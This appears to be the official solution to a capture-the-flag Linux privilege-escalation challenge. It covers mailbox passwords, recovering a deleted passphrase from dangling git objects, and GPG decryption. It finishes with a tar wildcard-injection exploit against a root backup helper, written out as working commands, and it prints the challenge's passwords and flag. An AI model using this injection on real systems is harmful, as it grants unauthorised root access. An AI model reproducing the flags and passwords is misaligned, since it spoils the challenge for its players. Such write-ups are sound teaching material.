# Rumor Mill #3 — Dead Drop: intended solution

## Overview
- **Category:** Linux
- **Difficulty:** Hard (400–800 pts)
- **Flag format:** `ingehack{...}`

Three accounts stand between you and root. Two of the hops are dead ends if
you trust what you are told; the last one is a real privilege escalation.

---

## Step 1 — y4ss1n3's mailbox

```bash
ssh -p 2222 y4ss1n3@<HOST>
cat /var/mail/y4ss1n3
```

Three messages. `n0d4` splits his password across two of them and warns that
someone keeps answering his threads. The third message, from `gh3nj4`, claims
the real password is `n0p3_n0p3_n0p3` — it is a lie.

Parts: `M4ilb0x` + `_1962_v3` → **`M4ilb0x_1962_v3`**

```bash
su - n0d4
```

## Step 2 — the dotfiles repo that remembers

```bash
cat ~/note.txt
ls -la ~/.local/share/rumor-dotfiles
```

`note.txt` says the drop passphrase was committed and then rewritten out of
history. Git keeps unreachable objects until gc prunes them:

```bash
cd ~/.local/share/rumor-dotfiles
git fsck --lost-found
# dangling commit <sha>
```

Walk the dangling commit, or read the blobs directly:

```bash
git fsck --lost-found | awk '/dangling commit/{print $3}' | while read -r c; do
    git show "$c"
done
```

That prints `DROP_PASSPHRASE=g1t_k33ps_wh4t_y0u_thr0w_4w4y`.

> The passphrase is **not** in `git log`; only the dangling objects hold it.

## Step 3 — open the dead drop

The pinentry dialog does not work over this sshd, so pass the passphrase on
the command line:

```bash
gpg --batch --pinentry-mode loopback \
    --passphrase 'g1t_k33ps_wh4t_y0u_thr0w_4w4y' \
    --decrypt ~/dead-drop.gpg
```

Contents:

```
boul3h14 / d34d_dr0p_4cc3ss
...
He keeps /srv/archive tidy with a root helper. It trusts whatever it finds
in the directory, and it does not ask him for a password.
```

```bash
su - boul3h14        # d34d_dr0p_4cc3ss
```

## Step 4 — the archive helper

```bash
cat ~/README
sudo -l
# (root) NOPASSWD: /usr/local/bin/rumor-archive
```

The helper is:

```sh
#!/bin/sh
set -e
cd /srv/archive
exec /bin/tar czf "/srv/backups/rumor-$(date +%s).tgz" *
```

The glob is expanded by the shell, and `tar` parses any argument that starts
with `-` as an option — even when it came from a filename. `/srv/archive` is
yours to fill.

`tar`'s `--checkpoint-action=exec=COMMAND` runs `COMMAND` when a checkpoint is
reached, and tar reaches for a shell. Plant two files and a payload:

```bash
cd /srv/archive

cat > exploit.sh <<'EOF'
#!/bin/sh
cp /root/dead-drop/flag.txt /tmp/root-flag
chmod 644 /tmp/root-flag
EOF
chmod +x exploit.sh

: > '--checkpoint=1'
: > '--checkpoint-action=exec=sh exploit.sh'

sudo /usr/local/bin/rumor-archive
```

The helper runs `tar czf ... *`, the expanded `*` includes the two option
files, tar executes `sh exploit.sh` as root, and the flag is copied out.

```bash
cat /tmp/root-flag
# ingehack{d34d_dr0ps_sp34k_l0ud3r_th4n_w0rds}
```

## Why the shortcuts fail

- `gh3nj4`'s "real password" is a decoy; `su` rejects it.
- The passphrase is gone from `git log`; `git log -p` shows nothing.
- `sudo -l` exposes exactly one command. There is no shell, no editor, and no
  wildcard on the sudoers line itself.
- The flag is 0600 root inside `/root/dead-drop`, so nothing short of root can
  read it.

## Cleanup (if you ran the exploit)

```bash
rm -f /tmp/root-flag
rm -rf /srv/archive/* /srv/backups/*
```
